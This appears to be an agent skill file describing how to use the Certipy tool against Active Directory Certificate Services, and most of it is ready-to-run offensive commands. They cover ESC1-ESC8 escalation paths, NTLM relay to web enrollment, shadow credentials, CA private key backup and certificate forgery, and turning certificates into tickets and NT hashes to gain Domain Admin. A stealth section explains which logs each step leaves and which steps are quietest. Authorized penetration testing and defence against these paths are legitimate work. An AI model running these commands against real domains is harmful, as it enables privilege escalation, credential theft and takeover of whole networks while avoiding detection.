---
name: certipy
description: "Enumerate and abuse Active Directory Certificate Services with Certipy: find ESC1-ESC8 paths, request and relay certificates, authenticate with PFX files. Use when a domain has an enterprise CA or you hold a certificate. Not for plain LDAP ACL abuse (use impacket) or SMB relay against non-CA targets (use ntlmrelayx)."
---

# Certipy

Certipy turns AD CS from a compliance checkbox into a privilege path. One `find` tells you which templates are misconfigured; one `req` converts that misconfiguration into a certificate; `auth` converts the certificate into a TGT and an NT hash. Because PKINIT authentication bypasses password policy and often MFA, a certificate is usually the quietest way to become Domain Admin.

This host runs **Certipy v5.1.0** (`certipy-ad` from pipx). The v5 CLI reshuffled the v4 layout: `find`, `req`, `auth`, `shadow`, `account`, `ca`, `template`, `cert`, `parse`, `forge`, `relay`. There is no global debug switch; every subcommand carries its own connection, authentication and LDAP option groups. Older writeups that use `certipy find -vulnerable -json` as a single blob or `certipy shadow auto -account x` may need adjustment; check `certipy <sub> -h` before pasting a v4 command.

## When to use

| Goal | Subcommand | Shape |
| --- | --- | --- |
| Discover CAs and vulnerable templates | `find` | `certipy find -u u@d -p p -dc-ip dc -vulnerable -stdout` |
| Escalate via template SAN (ESC1) | `req` | `certipy req -template X -upn administrator@d -ca CA` |
| Escalate via enrollment agent (ESC3) | `req` | `-on-behalf-of domain\administrator` |
| Rewrite a template you control (ESC4) | `template` | `-write-default-configuration` |
| Abuse CA officer rights (ESC7) | `ca` | `-add-officer` then `-issue-request` |
| Relay NTLM to web enrollment (ESC8) | `relay` | `certipy relay -target http://ca/certsrv/certfnsh.asp` |
| Certificate to TGT and NT hash | `auth` | `certipy auth -pfx admin.pfx -dc-ip dc` |
| Take over an account via Key Credential Link | `shadow` | `certipy shadow auto -account victim` |
| Create or modify an account | `account` | `create`, `read`, `update`, `delete` |
| Convert PFX to PEM or back | `cert` | `-pfx in.pfx -export-password x` |
| Forge from a stolen CA key | `forge` | `-ca-pfx ca.pfx -upn administrator@d` |

The eight classic paths, and the single command that tests each one:

| Path | Condition in the `find` output | First command |
| --- | --- | --- |
| ESC1 | requester-supplied SAN plus client-auth EKU, low-priv enrollment | `certipy req -template X -upn administrator@d -ca CA` |
| ESC2 | Any Purpose EKU, or no EKU at all | `certipy req -template X -ca CA`, then reuse the cert |
| ESC3 | a Certificate Request Agent template you can enroll in | `certipy req -on-behalf-of domain\administrator -pfx agent.pfx` |
| ESC4 | you hold WriteProperty or WriteDacl on the template object | `certipy template -template X -write-default-configuration` |
| ESC5 | control of the CA host or a PKI AD object (NTAuthCertificates, CA container) | takeover first, then `certipy ca -backup` |
| ESC6 | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` is set | `certipy req -upn administrator@d` on any template |
| ESC7 | you hold ManageCA or ManageCertificates on the CA | `certipy ca -add-officer` then `-issue-request` |
| ESC8 | HTTP enrollment endpoint that accepts NTLM | `certipy relay -target http://ca/certsrv/certfnsh.asp` |

## Prerequisites

- `certipy --version` prints `Certipy v5.1.0`; installed at `~/.local/bin/certipy`.
- LDAP reachability to the DC (636 by default, `-ldap-scheme ldap` for 389) and, for `req`, RPC to the CA or HTTP to its enrollment endpoint.
- Kerberos work needs a synchronised clock and a resolvable FQDN; prefer `-dc-host` plus `/etc/hosts` over fragile DNS.
- `find` writes nothing to the CA but does query LDAP hard; run it with an unprivileged account first.
- A PFX is a credential. Store it as you would a private key, and keep the PFX password out of shell history.

## Core invocations

```sh
# 1. enumerate everything, print to console, keep a JSON copy for parsing
certipy find -u alice@corp.local -p 'Winter2026!' -dc-ip 10.10.10.10 \
  -vulnerable -stdout -json -output corp-ca

# 2. enumerate without touching the CA host (DC LDAP only)
certipy find -u alice@corp.local -p 'Winter2026!' -dc-ip 10.10.10.10 -dc-only

# 3. include issuance policy OIDs, which is how ESC13 shows up
certipy find -u alice@corp.local -p 'Winter2026!' -dc-ip 10.10.10.10 -oids -enabled

# 4. ESC1: template allows a caller-supplied SAN and client auth
certipy req -u alice@corp.local -p 'Winter2026!' -ca CORP-CA \
  -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.10

# 5. ESC3: request an enrollment agent cert, then use it on behalf of a DA
certipy req -u alice@corp.local -p 'Winter2026!' -ca CORP-CA \
  -template EnrollmentAgent -dc-ip 10.10.10.10
certipy req -u alice@corp.local -p 'Winter2026!' -ca CORP-CA -template User \
  -on-behalf-of corp\administrator -pfx agent.pfx -dc-ip 10.10.10.10

# 6. ESC4: you can write the template object, so make it ESC1 yourself
certipy template -u alice@corp.local -p 'Winter2026!' -template TargetTemplate \
  -write-default-configuration -dc-ip 10.10.10.10

# 7. ESC7: you hold ManageCA or ManageCertificates
certipy ca -u alice@corp.local -p 'Winter2026!' -ca CORP-CA \
  -add-officer alice -dc-ip 10.10.10.10
certipy ca -u alice@corp.local -p 'Winter2026!' -ca CORP-CA \
  -enable-template SubCA -issue-request 15 -dc-ip 10.10.10.10

# 8. ESC8: relay coerced auth straight into the CA's HTTP enrollment
certipy relay -target http://ca01.corp.local -template DomainController

# 9. turn any certificate into a TGT plus the NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# 10. shadow credentials: add a key, authenticate, then clean up
certipy shadow auto -u alice@corp.local -p 'Winter2026!' -account svc-sql \
  -dc-ip 10.10.10.10

# 11. enumerate a target's Key Credential Links before you change them
certipy shadow list -u alice@corp.local -p 'Winter2026!' -account svc-sql \
  -dc-ip 10.10.10.10

# 12. account operations, used for ESC9-style UPN rewrites
certipy account read -u alice@corp.local -p 'Winter2026!' -user svc-sql \
  -dc-ip 10.10.10.10
certipy account update -u alice@corp.local -p 'Winter2026!' -user svc-sql \
  -upn administrator@corp.local -dc-ip 10.10.10.10

# 13. PFX handling and CA key theft
certipy cert -pfx administrator.pfx -password 'pfxpass' -export -nokey -out admin.crt
certipy ca -u alice@corp.local -p 'Winter2026!' -ca CORP-CA -backup -dc-ip 10.10.10.10
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -out forged.pfx
```

Kerberos path, once you hold a ticket:

```sh
export KRB5CCNAME=$PWD/alice.ccache
certipy find -u alice@corp.local -k -no-pass -dc-host dc01.corp.local -target dc01.corp.local -vulnerable
```

## Flags that matter

| Flag | Subcommand | Effect |
| --- | --- | --- |
| `-vulnerable` | find, parse | filter to templates vulnerable through nested group membership |
| `-enabled` | find | hide templates the CA does not publish |
| `-dc-only` | find | skip CA security and web enrollment checks; stealthier |
| `-stdout` / `-json` / `-text` / `-csv` / `-output` | find | output format and filename prefix |
| `-ca` | req, ca, relay | CA name; required for RPC and DCOM enrollment and for ESC11 |
| `-template` | req, template, relay | target template; `req` defaults to `User` |
| `-upn` / `-dns` / `-sid` / `-subject` | req, forge, relay | values stuffed into the SAN; the core of ESC1 and ESC6 |
| `-on-behalf-of` | req | enrollment-agent flow (ESC3); needs `-pfx` of the agent |
| `-web` / `-dcom` | req | enrollment protocol when RPC is blocked |
| `-dynamic-endpoint` | req, ca | prefer dynamic TCP over a named pipe |
| `-http-port` / `-http-scheme` / `-no-channel-binding` | req, relay | web enrollment tuning; channel binding breaks some relays |
| `-pfx` / `-pfx-password` | auth, req | input certificate and its password |
| `-ldap-shell` | auth | interactive LDAP console as the certificate's identity |
| `-no-hash` / `-no-save` / `-kirbi` | auth | skip hash retrieval, skip ccache, save kirbi instead |
| `-account` / `-device-id` | shadow | target account and the Key Credential Link to touch |
| `-write-default-configuration [sid]` | template | apply Certipy's ESC1 config; optional SID gets the rights |
| `-save-configuration` / `-no-save` / `-force` | template | back up before editing, skip the backup, skip confirmation |
| `-add-officer` / `-issue-request` / `-enable-template` | ca | ESC7 primitives |
| `-backup` / `-config` | ca | extract the CA certificate and private key |
| `-target protocol://host` | relay | `http://` for ESC8, `rpc://` for ESC11 |
| `-forever` / `-no-skip` / `-enum-templates` | relay | keep listening, re-attack the same users, list templates first |
| `-ldap-scheme` / `-ldap-port` / `-no-ldap-signing` | all | LDAP fallbacks when signing or channel binding is enforced |
| `-ns` / `-dc-host` / `-target` | all | name resolution and Kerberos SPN control |

## Workflow

1. **Find once, read carefully.** `find -vulnerable -stdout` gives you template name, EKUs, enrollment rights and CA flags. Note which templates a user you control can enroll in; that is the only column that matters.
2. **Pick the cheapest ESC.** ESC1 and ESC6 need one request. ESC3 needs two. ESC4 modifies the directory and must be reverted. ESC7 modifies the CA. ESC8 needs a coercion primitive and a relay position.
3. **Request and verify the identity.** `req` writes `<template>.pfx`. `certipy cert` shows the subject and SAN before you use it.
4. **Authenticate.** `certipy auth -pfx` yields `<user>.ccache` and prints the NT hash when PKINIT allows it. That hash is a Domain Admin credential if the certificate was for a DA.
5. **Persist sensibly.** A certificate outlives a password reset until the certificate expires or is revoked. Prefer short-lived abuse over leaving artefacts.
6. **Revert directory changes.** `template -write-configuration` from the saved backup, `shadow remove`/`clear`, `account update` back to the original UPN.
7. **Record what you changed.** Template ACLs, CA officers and Key Credential Links are all reviewable months later.

## OPSEC and telemetry

- Every enrollment is logged by the CA: 4886 (request received), 4887 (issued), 4888 (denied), 4889 (pending). A burst of 4886 against one template from one account is the clearest AD CS signal you will leave.
- PKINIT authentication is 4768 with `Certificate Information` populated, followed by the usual 4769/4624. It does not produce a 4625, which is why it is favoured for stealth.
- `template -write-default-configuration` changes the template object: 5136 on `CN=<Template>,CN=Certificate Templates,CN=Public Key Services,...`, with the modifying account recorded.
- Shadow credentials write `msDS-KeyCredentialLink` on the target: 5136 on that object, and the resulting logon is 4768 with PKINIT.
- `ca -backup` reads the CA private key over RPC; the CA service itself may log 4899/4900 around service activity.
- ESC8 relayed authentications appear as 4624 type 3 to the CA host from your IP, authenticated as the coerced machine or user, plus a 4886 for the certificate.
- `find` only queries LDAP and the CA's RPC/HTTP surface; it is the quietest step in the chain, so do all your thinking there rather than re-running `req`.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `find` reports no CA | no enterprise CA, or LDAP filtered | try `-dc-ip` explicitly, `-ldap-scheme ldap`, and confirm the host is a DC |
| `CERTSRV_E_TEMPLATE_DENIED` | you lack enroll rights on the template | check the template's ACL in `find` output; look for a group you are in |
| `CERTSRV_E_SUBJECT_ALT_NAME_REQUESTS` | ESC6 flag not set and the template forbids SAN | use ESC1-style template or the `-subject` variant |
| `auth` returns `KDC_ERR_CLIENT_NAME_MISMATCH` | certificate SAN does not match a real account | re-request with the correct `-upn`/`-dns` |
| `auth` succeeds but no NT hash | DC requires smartcard or PKINIT is restricted | use the ccache; hashes come only from a successful PKINIT reply |
| `template` write denied | no `WriteProperty`/`WriteDacl` on the template object | get ownership with `owneredit.py`, then re-ACL with `dacledit.py` |
| `shadow auto` fails at unlock | target needs a PIN or the DC rejects Key Trust | use `-device-id` to target an existing link, or check the DC's Key Trust setting |
| `relay` gets a certificate but `auth` fails | relayed account had no logon rights, or template mismatch | pass `-template DomainController` for DCs, `Machine` for workstations |
| LDAP errors about signing or channel binding | DC hardening | `-ldap-scheme ldaps`, or `-no-ldap-signing` on 389 |
| PFX prompts for a password you do not have | export used a password | `certipy cert -pfx x.pfx -password <pw> -export -out x.pem` |

## Verification

```sh
certipy --version                  # Certipy v5.1.0 - by Oliver Lyak (ly4k)
certipy find -h | head -5          # subcommand parser alive
certipy req -h | grep -c '^  -'    # option groups render
```

Expected: the version banner, then usage blocks that list `find options`, `certificate request options` and `authentication options`. Keep the `find` JSON, the template name, the request ID and the resulting ccache path as evidence.

## Related skills

- [impacket](../impacket/SKILL.md) for coercion, relay targets and ACL edits around AD CS
- [bloodhound-python](../bloodhound-python/SKILL.md) to see which principals can enroll in which templates
- [netexec](../netexec/SKILL.md) to validate the hash or ticket you obtain
- [enum4linux-ng](../enum4linux-ng/SKILL.md) for the unauthenticated look at the same DC